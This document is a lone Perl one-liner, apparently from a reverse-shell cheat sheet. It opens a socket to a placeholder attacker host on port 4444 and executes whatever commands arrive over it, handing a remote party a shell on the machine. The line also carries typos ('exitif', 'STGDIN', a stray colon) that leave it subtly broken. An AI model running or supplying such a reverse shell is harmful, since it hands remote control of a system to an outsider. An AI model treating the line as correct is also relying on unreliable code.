perl -MIO -e '$p=fork;exitif($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STGDIN->fdopen($c,r):$~->fdopen($c,w);system$_ while<>;'
